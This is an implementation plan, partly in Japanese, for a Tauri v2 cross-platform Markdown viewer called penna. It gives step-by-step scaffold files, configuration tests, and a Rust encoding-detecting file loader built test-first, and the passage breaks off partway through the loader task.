# penna v0.1 (MVP) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a lightweight cross-platform (Linux/Windows ARM+x86, macOS ARM) Markdown/plain-text VIEWER (no editing) on Tauri v2, opened via CLI, Finder/Explorer file association, and drag-and-drop, one window per file.

**Architecture:** A single-instance Rust process manages independent one-file-per-window WebView windows. Rust handles file IO, encoding detection, file watching, settings, and window/CLI routing; the vanilla-TS frontend renders Markdown (markdown-it -> DOMPurify) and plain text, with lazy syntax highlighting, in-document find, theme, and zoom. The frontend never touches the filesystem directly.

**Tech Stack:** Tauri v2 (Rust) + plugins (single-instance, store, opener, dialog); chardetng + encoding_rs; notify; vanilla TypeScript + Vite; markdown-it (+task-lists,+footnote); DOMPurify; highlight.js (lazy). Tests: cargo test + vitest/jsdom.

---

### Task 1: vanilla-ts フロントエンドを伴う Tauri v2 アプリの土台を作る

最初に「ビルドツール一式が揃い、開発ウィンドウが起動する」最小構成を、各ファイルを手書きで配置して用意する。ここではテスト基盤（vitest / cargo test）も同時に整える。スキャフォルドそのものはテスト対象の「振る舞い」を持たないため、TDD のレッド/グリーンは Task 3 以降の各モジュールで行い、本タスクは「ツールチェーンが起動・テスト実行できること」をスモークで確認する。

- [ ] **Step 1: ルートの `package.json` を作成する**

`/Users/okash1n/ghq/github.com/btajp/penna/package.json`:

```json
{
  "name": "penna",
  "private": true,
  "version": "0.1.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "tsc --noEmit && vite build",
    "preview": "vite preview",
    "tauri": "tauri",
    "test": "vitest run",
    "test:watch": "vitest"
  },
  "dependencies": {
    "@tauri-apps/api": "^2.2.0",
    "@tauri-apps/plugin-dialog": "^2.2.0",
    "@tauri-apps/plugin-opener": "^2.2.6",
    "@tauri-apps/plugin-store": "^2.2.0",
    "dompurify": "^3.2.3",
    "highlight.js": "^11.11.1",
    "markdown-it": "^14.1.0"
  },
  "devDependencies": {
    "@tauri-apps/cli": "^2.2.5",
    "@types/markdown-it": "^14.1.2",
    "jsdom": "^25.0.1",
    "typescript": "^5.7.3",
    "vite": "^6.0.7",
    "vitest": "^2.1.8"
  }
}
```

- [ ] **Step 2: `tsconfig.json` を作成する**

`/Users/okash1n/ghq/github.com/btajp/penna/tsconfig.json`:

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "useDefineForClassFields": true,
    "module": "ESNext",
    "lib": ["ES2022", "DOM", "DOM.Iterable"],
    "skipLibCheck": true,
    "moduleResolution": "bundler",
    "allowImportingTsExtensions": true,
    "isolatedModules": true,
    "moduleDetection": "force",
    "noEmit": true,
    "strict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noFallthroughCasesInSwitch": true,
    "types": ["vite/client", "vitest/globals"]
  },
  "include": ["src", "tests"]
}
```

- [ ] **Step 3: `vite.config.ts` を作成する（Tauri 連携 + vitest 設定込み）**

Tauri 公式テンプレート準拠で、`clearScreen:false`・固定ポート 1420・`TAURI_*` env を尊重する。vitest は jsdom 環境を使う。

`/Users/okash1n/ghq/github.com/btajp/penna/vite.config.ts`:

```ts
/// <reference types="vitest/config" />
import { defineConfig } from "vite";

const host = process.env.TAURI_DEV_HOST;

// @tauri-apps/cli が起動するため、Vite は固定設定で動かす
export default defineConfig({
  // Tauri が stdout を期待するためログをクリアしない
  clearScreen: false,
  server: {
    port: 1420,
    strictPort: true,
    host: host || false,
    hmr: host
      ? {
          protocol: "ws",
          host,
          port: 1421,
        }
      : undefined,
    watch: {
      // src-tauri の変更は Vite 側で監視しない（Rust 側が再ビルド）
      ignored: ["**/src-tauri/**"],
    },
  },
  // TAURI_ENV_* を尊重したビルドターゲット
  envPrefix: ["VITE_", "TAURI_ENV_"],
  build: {
    target:
      process.env.TAURI_ENV_PLATFORM === "windows" ? "chrome105" : "safari13",
    minify: !process.env.TAURI_ENV_DEBUG ? "esbuild" : false,
    sourcemap: !!process.env.TAURI_ENV_DEBUG,
  },
  test: {
    globals: true,
    environment: "jsdom",
    include: ["tests/**/*.test.ts", "src/**/*.test.ts"],
  },
});
```

- [ ] **Step 4: `index.html` を作成する**

`/Users/okash1n/ghq/github.com/btajp/penna/index.html`:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>penna</title>
  </head>
  <body>
    <div id="app"></div>
    <script type="module" src="/src/main.ts"></script>
  </body>
</html>
```

- [ ] **Step 5: 最小の `src/main.ts` を作成する（後続タスクで本実装に差し替え）**

スキャフォルド時点では「ウィンドウが起動し DOM が描かれる」ことの確認用プレースホルダーを置く。`main.ts` の本実装（bootstrap）は別エリアの Task で上書きする。

`/Users/okash1n/ghq/github.com/btajp/penna/src/main.ts`:

```ts
// penna frontend bootstrap (placeholder — replaced in the main.ts task)
const app = document.querySelector<HTMLDivElement>("#app");
if (app) {
  app.textContent = "penna";
}
```

- [ ] **Step 6: フロントエンド依存をインストールする**

```
Run: npm install
Expected: node_modules/ が生成され、"added N packages" と表示される（エラー無し）
```

- [ ] **Step 7: `src-tauri/Cargo.toml` を作成する（Tauri v2 + 必要クレート + 4 プラグイン）**

ローダー/監視/設定の各クレートもここで宣言しておく（後続エリアの実装が依存するため）。単一インスタンスを含む 4 プラグインを依存に入れる。

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/Cargo.toml`:

```toml
[package]
name = "penna"
version = "0.1.0"
description = "A lightweight Markdown / plain-text viewer"
authors = ["penna"]
edition = "2021"
rust-version = "1.77.2"

[lib]
name = "penna_lib"
crate-type = ["staticlib", "cdylib", "rlib"]

[build-dependencies]
tauri-build = { version = "2", features = [] }

[dependencies]
tauri = { version = "2", features = [] }
tauri-plugin-single-instance = "2"
tauri-plugin-store = "2"
tauri-plugin-opener = "2"
tauri-plugin-dialog = "2"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
chardetng = "0.1"
encoding_rs = "0.8"
notify = "6"
```

- [ ] **Step 8: `src-tauri/build.rs` を作成する**

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/build.rs`:

```rust
fn main() {
    tauri_build::build()
}
```

- [ ] **Step 9: `src-tauri/src/lib.rs` を作成する（プラグイン登録の最小骨格）**

単一インスタンスプラグインは **必ず最初に** 登録する（Tauri 公式の要件: 他プラグインより前に置く）。引数振り分けや WindowRegistry は後続エリアの Task で `run()` に追記する。ここでは「4 プラグインが登録され、空ウィンドウが setup で開く」最小骨格にとどめる。

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/src/lib.rs`:

```rust
#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        // single-instance MUST be registered first
        .plugin(tauri_plugin_single_instance::init(|_app, _argv, _cwd| {
            // secondary launch routing is wired in the window/startup task
        }))
        .plugin(tauri_plugin_store::Builder::default().build())
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .setup(|app| {
            // open an empty window on first launch (replaced by startup/CLI task)
            let _ = tauri::WebviewWindowBuilder::new(
                app,
                "doc-1",
                tauri::WebviewUrl::App("index.html".into()),
            )
            .title("penna")
            .inner_size(900.0, 700.0)
            .visible(false)
            .build()?;
            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
```

- [ ] **Step 10: `src-tauri/src/main.rs` を作成する**

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/src/main.rs`:

```rust
// Prevents an extra console window on Windows in release builds.
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

fn main() {
    penna_lib::run()
}
```

- [ ] **Step 11: `tests/smoke.test.ts` を作成する（vitest が動くことのスモーク）**

ツールチェーンが正しく組まれているかを最初に固定する小さなテスト。後続エリアの本テストが置かれる `tests/` を先に成立させる。

`/Users/okash1n/ghq/github.com/btajp/penna/tests/smoke.test.ts`:

```ts
import { describe, it, expect } from "vitest";

describe("toolchain smoke", () => {
  it("runs vitest in a jsdom environment", () => {
    const el = document.createElement("div");
    el.textContent = "penna";
    expect(el.textContent).toBe("penna");
  });
});
```

- [ ] **Step 12: フロントエンドのテストを実行する（PASS を確認）**

```
Run: npm test
Expected: PASS  tests/smoke.test.ts (1 test) — "Test Files  1 passed (1)"
```

- [ ] **Step 13: 最小の `src-tauri/tauri.conf.json` を作成する（dev スモーク用。Task 2 で本設定に拡張）**

`npm run tauri dev` を通すための最小構成。window 詳細・fileAssociations は Task 2 で追記する。

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/tauri.conf.json`:

```json
{
  "$schema": "https://schema.tauri.app/config/2",
  "productName": "penna",
  "version": "0.1.0",
  "identifier": "app.penna.viewer",
  "build": {
    "beforeDevCommand": "npm run dev",
    "devUrl": "http://localhost:1420",
    "beforeBuildCommand": "npm run build",
    "frontendDist": "../dist"
  },
  "app": {
    "windows": [],
    "security": {
      "csp": null
    }
  },
  "bundle": {
    "active": true,
    "targets": "all",
    "icon": [
      "icons/32x32.png",
      "icons/128x128.png",
      "icons/128x128@2x.png",
      "icons/icon.icns",
      "icons/icon.ico"
    ]
  }
}
```

- [ ] **Step 14: アプリアイコンを生成する**

Tauri はバンドルに各サイズのアイコンを要求する。CLI のアイコン生成で `src-tauri/icons/` 一式を作る（既存の任意 PNG/SVG を入力に使う。無ければ Tauri のデフォルトを流用）。

```
Run: npm run tauri icon
Expected: src-tauri/icons/ に 32x32.png / 128x128.png / 128x128@2x.png / icon.icns / icon.ico などが生成される
```

- [ ] **Step 15: dev スモークを実行する（ウィンドウが開くことを確認）**

```
Run: npm run tauri dev
Expected: Rust が初回ビルドされ、"penna" と表示されたネイティブウィンドウが 1 枚開く。コンソールに Vite の "VITE ready" が出る。確認後 Ctrl+C で終了。
```

- [ ] **Step 16: `.gitignore` を作成する**

`/Users/okash1n/ghq/github.com/btajp/penna/.gitignore`:

```
# dependencies
node_modules/

# build output
dist/
src-tauri/target/

# editor / OS
.DS_Store
*.log
```

- [ ] **Step 17: スキャフォルドをコミットする**

```
Run: git add -A && git commit -m "chore: scaffold Tauri v2 app with vanilla-ts frontend and vitest"
Expected: 1 file changed 系のサマリが表示され、コミットが作成される
```

### Task 2: tauri.conf.json / Cargo の拡張子関連付け・ウィンドウ既定・capabilities を構成する

ウィンドウ既定（サイズ・準備完了まで非表示）、Markdown 拡張子の `fileAssociations`（`.txt` は意図的に未登録）、4 プラグインの capabilities/permissions、そしてファイルディレクトリにスコープ可能な asset protocol を設定する。`MARKDOWN_EXTENSIONS` の定義値（`["md","markdown","mdown","mkd","mkdn","mdwn"]`）と一致させる。

- [ ] **Step 1: 拡張子関連付けが Markdown 6 種を含み `.txt` を含まないことを検証するテストを書く（FAIL 先行）**

設定 JSON は宣言データなので、その内容が契約どおりであることを vitest で固定する。まずレッドにする。

`/Users/okash1n/ghq/github.com/btajp/penna/tests/tauri-conf.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const conf = JSON.parse(
  readFileSync(
    fileURLToPath(new URL("../src-tauri/tauri.conf.json", import.meta.url)),
    "utf-8",
  ),
);

const MARKDOWN_EXTENSIONS = ["md", "markdown", "mdown", "mkd", "mkdn", "mdwn"];

describe("tauri.conf.json file associations", () => {
  it("registers exactly the markdown extensions", () => {
    const assoc = conf.bundle.fileAssociations;
    expect(Array.isArray(assoc)).toBe(true);
    const exts: string[] = assoc.flatMap((a: { ext: string[] }) => a.ext);
    expect([...exts].sort()).toEqual([...MARKDOWN_EXTENSIONS].sort());
  });

  it("does NOT register the .txt extension by default", () => {
    const assoc = conf.bundle.fileAssociations;
    const exts: string[] = assoc.flatMap((a: { ext: string[] }) => a.ext);
    expect(exts).not.toContain("txt");
  });

  it("uses the Viewer role and Markdown Document name", () => {
    const assoc = conf.bundle.fileAssociations[0];
    expect(assoc.role).toBe("Viewer");
    expect(assoc.name).toBe("Markdown Document");
  });

  it("hides windows until the frontend is ready", () => {
    const win = conf.app.windows[0];
    expect(win.visible).toBe(false);
    expect(win.width).toBe(900);
    expect(win.height).toBe(700);
  });
});
```

- [ ] **Step 2: テストを実行して FAIL を確認する**

```
Run: npm test -- tests/tauri-conf.test.ts
Expected: FAIL — "file associations" 系が落ちる（fileAssociations 未定義 / windows[0] 未定義で TypeError or AssertionError）
```

- [ ] **Step 3: `tauri.conf.json` を本設定に拡張する（window 既定 + fileAssociations + assetProtocol スコープ）**

window はビルダー側で動的生成するが、`fileAssociations` 経由のダブルクリック起動でも既定値を効かせるため `app.windows[0]` にも既定を宣言する（width/height/`visible:false`）。実際の表示は frontend 準備完了後に `show()` する（main.ts エリアで実装）。asset protocol を有効化し、スコープは実行時に開いたファイルのディレクトリへ動的設定する方針なので、静的スコープは空にしておく。

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/tauri.conf.json` を全文置き換え:

```json
{
  "$schema": "https://schema.tauri.app/config/2",
  "productName": "penna",
  "version": "0.1.0",
  "identifier": "app.penna.viewer",
  "build": {
    "beforeDevCommand": "npm run dev",
    "devUrl": "http://localhost:1420",
    "beforeBuildCommand": "npm run build",
    "frontendDist": "../dist"
  },
  "app": {
    "windows": [
      {
        "label": "doc-1",
        "title": "penna",
        "width": 900,
        "height": 700,
        "minWidth": 360,
        "minHeight": 240,
        "visible": false,
        "decorations": true,
        "resizable": true
      }
    ],
    "security": {
      "csp": null,
      "assetProtocol": {
        "enable": true,
        "scope": []
      }
    }
  },
  "bundle": {
    "active": true,
    "targets": "all",
    "icon": [
      "icons/32x32.png",
      "icons/128x128.png",
      "icons/128x128@2x.png",
      "icons/icon.icns",
      "icons/icon.ico"
    ],
    "fileAssociations": [
      {
        "name": "Markdown Document",
        "role": "Viewer",
        "ext": ["md", "markdown", "mdown", "mkd", "mkdn", "mdwn"],
        "mimeType": "text/markdown",
        "description": "Markdown document"
      }
    ]
  }
}
```

- [ ] **Step 4: テストを実行して PASS を確認する**

```
Run: npm test -- tests/tauri-conf.test.ts
Expected: PASS — 4 tests passed（associations / no .txt / Viewer+name / window defaults）
```

- [ ] **Step 5: capabilities の権限を検証するテストを書く（FAIL 先行）**

capabilities JSON も契約データなので、core:window と 3 プラグイン権限、asset protocol 権限が含まれることを固定する。まずレッドにする。

`/Users/okash1n/ghq/github.com/btajp/penna/tests/capabilities.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const cap = JSON.parse(
  readFileSync(
    fileURLToPath(
      new URL("../src-tauri/capabilities/default.json", import.meta.url),
    ),
    "utf-8",
  ),
);

describe("default capability", () => {
  const perms: string[] = cap.permissions.map((p: unknown) =>
    typeof p === "string" ? p : (p as { identifier: string }).identifier,
  );

  it("targets all windows", () => {
    expect(cap.windows).toEqual(["*"]);
  });

  it("grants core window control", () => {
    expect(perms).toContain("core:window:default");
    expect(perms).toContain("core:window:allow-show");
  });

  it("grants store, opener and dialog defaults", () => {
    expect(perms).toContain("store:default");
    expect(perms).toContain("opener:default");
    expect(perms).toContain("dialog:default");
  });

  it("grants scoped asset protocol access", () => {
    expect(perms).toContain("core:asset-protocol:default");
    const scoped = cap.permissions.find(
      (p: unknown) =>
        typeof p === "object" &&
        (p as { identifier: string }).identifier ===
          "core:asset-protocol:allow-asset",
    );
    expect(scoped).toBeDefined();
  });
});
```

- [ ] **Step 6: テストを実行して FAIL を確認する**

```
Run: npm test -- tests/capabilities.test.ts
Expected: FAIL — capabilities/default.json が存在せず ENOENT、または permissions 未定義で落ちる
```

- [ ] **Step 7: `src-tauri/capabilities/default.json` を作成する**

全ウィンドウ（`"*"`）に対し、core:window（show 含む）、store/opener/dialog の default、event 受信、asset protocol を付与する。asset protocol のスコープは実行時にファイルディレクトリへ動的追加するため、静的には空配列で宣言（`allow-asset` の枠だけ確保）する。

`/Users/okash1n/ghq/github.com/btajp/penna/src-tauri/capabilities/default.json`:

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Default capability for penna document windows",
  "windows": ["*"],
  "permissions": [
    "core:default",
    "core:window:default",
    "core:window:allow-show",
    "core:window:allow-hide",
    "core:window:allow-set-title",
    "core:webview:default",
    "core:event:default",
    "store:default",
    "opener:default",
    "dialog:default",
    "core:asset-protocol:default",
    {
      "identifier": "core:asset-protocol:allow-asset",
      "allow": [{ "url": "asset://localhost/**" }]
    }
  ]
}
```

- [ ] **Step 8: テストを実行して PASS を確認する**

```
Run: npm test -- tests/capabilities.test.ts
Expected: PASS — 4 tests passed（windows / core window / store+opener+dialog / asset protocol）
```

- [ ] **Step 9: Rust 側がコンパイルできることを確認する（capabilities/conf の整合チェック）**

`tauri.conf.json` の権限スキーマと `Cargo.toml` のプラグインが整合しているかは Rust ビルドで検出される。check で固定する。

```
Run: npm run tauri build -- --target aarch64-apple-darwin --debug --no-bundle
Expected: cargo がプラグインの permission スキーマを生成し、コンパイル成功（"Finished" 表示）。capabilities の不正な permission 識別子があればここで失敗する。
```

- [ ] **Step 10: 全テストをまとめて実行する（リグレッション確認）**

```
Run: npm test
Expected: PASS — tests/smoke.test.ts, tests/tauri-conf.test.ts, tests/capabilities.test.ts すべて green（3 files passed）
```

- [ ] **Step 11: 設定とテストをコミットする**

```
Run: git add -A && git commit -m "feat: configure tauri window defaults, markdown file associations, and capabilities"
Expected: コミットが作成される（tauri.conf.json / capabilities/default.json / tests 追加）
```

### Task 3: Rust loader — ファイル種別判定とエンコーディング自動判定

このタスクでは `src-tauri/src/loader.rs` を契約どおりに実装する。`FileKind` 列挙体（serde Serialize、`"Markdown"`/`"PlainText"` として直列化）、`LoadedFile` 構造体、拡張子による `detect_kind`、バイト読込→BOM 判定→chardetng 判定→encoding_rs デコードを行う `load_file` を、TDD（テスト先行）で組み立てる。各ステップは Red（失敗するテストを書いて実行・FAIL を確認）→ Green（最小実装で PASS）→ commit の順に進める。

依存クレートは `chardetng` と `encoding_rs`。BOM 付き UTF-16 は chardetng（非 BOM のレガシー判定器）では確実に判定できないため、`encoding_rs::Encoding::for_bom()` を先に試し、BOM が無い場合のみ chardetng にフォールバックする。これは仕様 7 章の「UTF-16（BOM）対応」要件を満たすために必要な実装詳細である。

---

- [ ] **Step 1: Cargo.toml に loader 用の依存クレートを追加する**

`src-tauri/Cargo.toml` の `[dependencies]` セクションに `chardetng` と `encoding_rs` を追加する（`serde` は Tauri スキャフォールド時に既に入っている前提だが、`derive` feature が無い場合に備えて明記する）。

```toml
[dependencies]
serde = { version = "1", features = ["derive"] }
serde_json = "1"
chardetng = "0.1"
encoding_rs = "0.8"
```

Run:

```bash
cd src-tauri && cargo build 2>&1 | tail -5
```

Expected:

```
   Compiling chardetng v0.1.x
   Compiling encoding_rs v0.8.x
    Finished `dev` profile [unoptimized + debuginfo] target(s) in ...
```

- [ ] **Step 2: loader モジュールの空ファイルを作成し lib.rs に登録する**

`src-tauri/src/loader.rs` を作成し、まず公開アイテムの「型のシグネチャだけ」を置く（中身は次ステップ以降で TDD する）。`detect_kind` / `load_file` は `unimplemented!()` で始めることで、テストが「コンパイルは通るが実行で FAIL する」状態を作る。

`src-tauri/src/loader.rs`:

```rust
use serde::Serialize;
use std::path::Path;

/// Markdown とみなす拡張子（大文字小文字を区別しない）。
pub const MARKDOWN_EXTENSIONS: [&str; 6] = ["md", "markdown", "mdown", "mkd", "mkdn", "mdwn"];

/// ファイルの描画種別。serde では "Markdown" / "PlainText" として直列化される。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum FileKind {
    Markdown,
    PlainText,
}

/// 読み込み済みファイルの内容とメタデータ。
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct LoadedFile {
    pub path: String,
    pub text: String,
    pub encoding: String,
    pub kind: FileKind,
}

/// 拡張子からファイル種別を判定する（大文字小文字を区別しない）。
pub fn detect_kind(path: &Path) -> FileKind {
    unimplemented!()
}

/// パスを読み込み、エンコーディングを自動判定して UTF-8 文字列に変換した LoadedFile を返す。
pub fn load_file(path: &Path) -> Result<LoadedFile, String> {
    unimplemented!()
}
```

`src-tauri/src/lib.rs`（`penna_lib` ライブラリクレートのルート）の先頭（モジュール宣言部）に登録する（既存ファイルへの追記）。`main.rs` には `fn main() { penna_lib::run() }` 以外を置かないため、すべてのバックエンドモジュールは `lib.rs` で宣言し、各モジュールからは `crate::loader` のように `penna_lib` クレート内で解決する:

```rust
mod loader;
```

Run:

```bash
cd src-tauri && cargo build 2>&1 | tail -3
```

Expected:

```
warning: unused variable: `path`
    Finished `dev` profile [unoptimized + debuginfo] target(s) in ...
```

Commit:

```bash
git add src-tauri/Cargo.toml src-tauri/src/loader.rs src-tauri/src/lib.rs
git commit -m "chore: add loader module skeleton and encoding deps"
```

- [ ] **Step 3: detect_kind のテストを書いて FAIL させる（Red）**

`src-tauri/src/loader.rs` の末尾に `#[cfg(test)]` モジュールを追加する。Markdown 拡張子（`.md` / 大文字 `.MD` / `.markdown` / `.mkd`）が `Markdown` に、それ以外（`.txt` / `.rs` / 拡張子なし）が `PlainText` になることを検証する。

`src-tauri/src/loader.rs` の末尾に追記:

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn detect_kind_recognizes_markdown_extensions() {
        assert_eq!(detect_kind(&PathBuf::from("README.md")), FileKind::Markdown);
        assert_eq!(detect_kind(&PathBuf::from("DOC.MD")), FileKind::Markdown);
        assert_eq!(detect_kind(&PathBuf::from("notes.markdown")), FileKind::Markdown);
        assert_eq!(detect_kind(&PathBuf::from("a.mkd")), FileKind::Markdown);
    }

    #[test]
    fn detect_kind_treats_others_as_plain_text() {
        assert_eq!(detect_kind(&PathBuf::from("log.txt")), FileKind::PlainText);
        assert_eq!(detect_kind(&PathBuf::from("main.rs")), FileKind::PlainText);
        assert_eq!(detect_kind(&PathBuf::from("Makefile")), FileKind::PlainText);
    }
}
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests::detect_kind 2>&1 | tail -15
```

Expected (FAIL — `unimplemented!()` で panic):

```
test loader::tests::detect_kind_recognizes_markdown_extensions ... FAILED
test loader::tests::detect_kind_treats_others_as_plain_text ... FAILED
...
panicked at 'not implemented', src/loader.rs:...
test result: FAILED. 0 passed; 2 failed; ...
```

- [ ] **Step 4: detect_kind を実装してテストを PASS させる（Green）**

`detect_kind` の `unimplemented!()` を、拡張子を小文字化して `MARKDOWN_EXTENSIONS` と照合する実装に置き換える。

`src-tauri/src/loader.rs` の `detect_kind` を置換:

```rust
pub fn detect_kind(path: &Path) -> FileKind {
    let is_markdown = path
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| {
            let ext = ext.to_ascii_lowercase();
            MARKDOWN_EXTENSIONS.contains(&ext.as_str())
        })
        .unwrap_or(false);

    if is_markdown {
        FileKind::Markdown
    } else {
        FileKind::PlainText
    }
}
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests::detect_kind 2>&1 | tail -8
```

Expected (PASS):

```
test loader::tests::detect_kind_recognizes_markdown_extensions ... ok
test loader::tests::detect_kind_treats_others_as_plain_text ... ok

test result: ok. 2 passed; 0 failed; ...
```

Commit:

```bash
git add src-tauri/src/loader.rs
git commit -m "feat: implement detect_kind by extension"
```

- [ ] **Step 5: UTF-8 ファイルを読む load_file のテストを書いて FAIL させる（Red）**

一時ディレクトリに UTF-8 のファイルを書き出し、`load_file` が `text`・`encoding == "UTF-8"`・`kind == Markdown`・`path`（絶対パス文字列）を正しく返すことを検証する。`std::env::temp_dir()` + プロセス ID で衝突しないパスを作り、テスト後に削除する（外部クレート不要）。

`src-tauri/src/loader.rs` の `mod tests` 内に追記:

```rust
    use std::fs;

    /// テスト用に一意な一時ファイルパスを作る（外部クレート不要）。
    fn temp_path(name: &str) -> PathBuf {
        let mut p = std::env::temp_dir();
        p.push(format!("penna_loader_test_{}_{}", std::process::id(), name));
        p
    }

    #[test]
    fn load_file_decodes_utf8() {
        let path = temp_path("utf8.md");
        fs::write(&path, "# 見出し\n\n本文 hello\n".as_bytes()).unwrap();

        let loaded = load_file(&path).expect("should load utf8 file");

        assert_eq!(loaded.kind, FileKind::Markdown);
        assert_eq!(loaded.encoding, "UTF-8");
        assert_eq!(loaded.text, "# 見出し\n\n本文 hello\n");
        assert_eq!(loaded.path, path.to_string_lossy().to_string());

        let _ = fs::remove_file(&path);
    }
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests::load_file_decodes_utf8 2>&1 | tail -10
```

Expected (FAIL — `unimplemented!()` で panic):

```
test loader::tests::load_file_decodes_utf8 ... FAILED
...
panicked at 'not implemented', src/loader.rs:...
test result: FAILED. 0 passed; 1 failed; ...
```

- [ ] **Step 6: load_file を実装する（BOM 優先 → chardetng フォールバック → encoding_rs デコード）（Green）**

`load_file` の `unimplemented!()` を実装に置き換える。手順は次のとおり: (1) バイト読込、(2) `Encoding::for_bom()` で BOM を検出（あればそのエンコーディングと BOM 長を採用）、(3) BOM が無ければ chardetng で判定、(4) 採用したエンコーディングで BOM 部分を除いたバイト列をデコードし、`Encoding::name()` を `encoding` として返す。デコードは `encoding.decode(bytes)` を使い、置換が起きても文字列は得られる（読み取り専用ビューワーのため致命的失敗にしない）。

`src-tauri/src/loader.rs` の `use` 行を更新（先頭の `use` 群に追記）:

```rust
use encoding_rs::Encoding;
```

`load_file` を置換:

```rust
pub fn load_file(path: &Path) -> Result<LoadedFile, String> {
    let bytes = std::fs::read(path)
        .map_err(|e| format!("failed to read {}: {}", path.display(), e))?;

    // 1) BOM があればそれを最優先（chardetng は BOM を見ない）。
    let (encoding, content) = match Encoding::for_bom(&bytes) {
        Some((enc, bom_len)) => (enc, &bytes[bom_len..]),
        None => {
            // 2) BOM が無ければ chardetng で判定。
            let mut detector = chardetng::EncodingDetector::new();
            detector.feed(&bytes, true);
            let enc = detector.guess(None, true);
            (enc, &bytes[..])
        }
    };

    let (text, _used_encoding, _had_errors) = encoding.decode(content);

    Ok(LoadedFile {
        path: path.to_string_lossy().to_string(),
        text: text.into_owned(),
        encoding: encoding.name().to_string(),
        kind: detect_kind(path),
    })
}
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests::load_file_decodes_utf8 2>&1 | tail -8
```

Expected (PASS):

```
test loader::tests::load_file_decodes_utf8 ... ok

test result: ok. 1 passed; 0 failed; ...
```

Commit:

```bash
git add src-tauri/src/loader.rs
git commit -m "feat: implement load_file with BOM and chardetng detection"
```

- [ ] **Step 7: Shift_JIS バイト列のテストを書いて実行する（Red→Green を一度に確認）**

Shift_JIS でエンコードされた日本語バイト列をファイルに書き、`load_file` が `encoding == "Shift_JIS"` を返し、テキストが UTF-8 に復号されることを検証する。chardetng は短すぎるバイト列だと自信を持って判定できないため、`"日本語"`（`[0x93,0x9C,0x96,0x7B,0x8C,0xEA]`）を句読点付きで複数回繰り返して判定を安定させる。`.txt` 拡張子なので `kind == PlainText` も確認する。

`src-tauri/src/loader.rs` の `mod tests` 内に追記:

```rust
    #[test]
    fn load_file_decodes_shift_jis() {
        // "日本語" を Shift_JIS でエンコードしたバイト列。
        let nihongo: [u8; 6] = [0x93, 0x9C, 0x96, 0x7B, 0x8C, 0xEA];
        // 句読点 "。" (Shift_JIS 0x81,0x42) を挟みつつ判定が安定する長さまで繰り返す。
        let kuten: [u8; 2] = [0x81, 0x42];
        let mut bytes: Vec<u8> = Vec::new();
        for _ in 0..8 {
            bytes.extend_from_slice(&nihongo);
            bytes.extend_from_slice(&kuten);
        }

        let path = temp_path("sjis.txt");
        fs::write(&path, &bytes).unwrap();

        let loaded = load_file(&path).expect("should load shift_jis file");

        assert_eq!(loaded.kind, FileKind::PlainText);
        assert_eq!(loaded.encoding, "Shift_JIS");
        assert!(loaded.text.starts_with("日本語。"));

        let _ = fs::remove_file(&path);
    }
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests::load_file_decodes_shift_jis 2>&1 | tail -8
```

Expected (PASS — Step 6 の実装が chardetng 経由で Shift_JIS を判定する):

```
test loader::tests::load_file_decodes_shift_jis ... ok

test result: ok. 1 passed; 0 failed; ...
```

注意: 万一 `encoding` が `Shift_JIS` 以外（例 `windows-1252`）になり FAIL する場合、判定対象バイト列が短すぎることが原因なので、上記ループ回数（`0..8`）を `0..16` 等へ増やして再実行する。実装側の変更は不要。

Commit:

```bash
git add src-tauri/src/loader.rs
git commit -m "test: cover Shift_JIS detection in load_file"
```

- [ ] **Step 8: UTF-16 BOM ファイルのテストを書いて実行する（Red→Green を一度に確認）**

UTF-16LE の BOM（`0xFF, 0xFE`）付きバイト列をファイルに書き、`load_file` が `encoding == "UTF-16LE"` を返し正しく復号することを検証する。`str::encode_utf16()` でコードユニットを生成し、リトルエンディアンのバイト列に展開する。これは Step 6 の `Encoding::for_bom()` 分岐が動作することの確認である。

`src-tauri/src/loader.rs` の `mod tests` 内に追記:

```rust
    #[test]
    fn load_file_decodes_utf16le_bom() {
        let content = "# Title\nこんにちは\n";
        let mut bytes: Vec<u8> = vec![0xFF, 0xFE]; // UTF-16LE BOM
        for unit in content.encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let path = temp_path("utf16le.md");
        fs::write(&path, &bytes).unwrap();

        let loaded = load_file(&path).expect("should load utf16le file");

        assert_eq!(loaded.kind, FileKind::Markdown);
        assert_eq!(loaded.encoding, "UTF-16LE");
        assert_eq!(loaded.text, content);

        let _ = fs::remove_file(&path);
    }
```

Run:

```bash
cd src-tauri && cargo test --lib loader::tests::load_file_decodes_utf16le_bom 2>&1 | tail -8
```

Expected (PASS):

```
test loader::tests::load_file_decodes_utf16le_bom ... ok

